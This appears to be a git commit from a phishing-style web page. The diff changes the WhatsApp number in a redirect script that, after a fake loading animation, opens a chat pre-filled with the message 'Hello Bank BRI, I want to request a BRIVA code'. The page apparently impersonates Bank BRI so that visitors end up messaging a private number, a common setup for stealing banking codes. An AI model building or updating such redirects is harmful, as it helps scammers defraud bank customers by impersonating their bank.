b65769f5f7487f29b29e0b630a0490c2bcfe5b95
hostingfree <gopay882@gmail.com>
2024-10-05 13:56:52 +0700

    Update token.js

--- token.js
+++ token.js
@@ -5,7 +5,7 @@ $(document).ready(function() {
     $("#process1").show();
  $('.load').fadeIn();
     setTimeout(function(){      
-location.href='https://wa.me/6281215141117?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20request%20kode%20BRIVA';
+location.href='https://wa.me/6281295629744?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20request%20kode%20BRIVA';
  $("#process1").hide();
  $('.load').fadeOut();        
          }, 2000);
